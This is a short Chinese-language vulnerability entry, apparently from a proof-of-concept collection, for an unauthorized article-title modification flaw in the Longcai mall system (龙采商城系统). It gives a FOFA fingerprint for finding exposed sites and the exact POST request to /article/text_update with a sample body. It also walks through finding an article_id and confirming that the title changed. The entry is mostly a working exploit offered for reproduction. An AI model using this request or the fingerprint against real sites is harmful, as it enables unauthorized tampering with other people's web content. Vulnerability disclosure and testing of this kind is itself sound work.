# 龙采商城系统存在未授权修改文章title

- **系统**：龙采商城系统　|　**类型**：未授权访问　|　**CVE**：—
- **指纹**：`FOFA：body="'url':'/pc2.0/index/index'"`
- **请求**：`POST /article/text_update HTTP/2`

**请求体 / payload**
```
来到帮助中心，随机找一个分类标题，F12查看其article_id记录下来，替换掉POC里的id值，请求POC，更改data内容（建议以原来title内容+1作为区分，攻击后记得改回来），刷新页面发现标题已经被更改！
Host: xxx
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 39
id=77&parameter=title&data=常见问题1
刷新以后发现已将"购物流程"修改为"常见问题1"
>
```

**其他**
- 龙采商城系统存在未授权修改文章title: + 一、漏洞描述
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: 龙采商城系统